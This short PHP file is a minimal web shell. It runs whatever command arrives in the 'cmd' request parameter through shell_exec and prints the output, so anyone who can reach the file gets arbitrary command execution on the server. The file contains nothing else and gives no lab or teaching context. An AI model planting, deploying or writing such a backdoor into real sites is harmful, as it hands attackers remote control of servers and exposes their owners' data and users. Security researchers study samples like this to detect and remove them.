<?php
    $output = shell_exec($_REQUEST['cmd']);
    echo "[os] " . $output;
?>
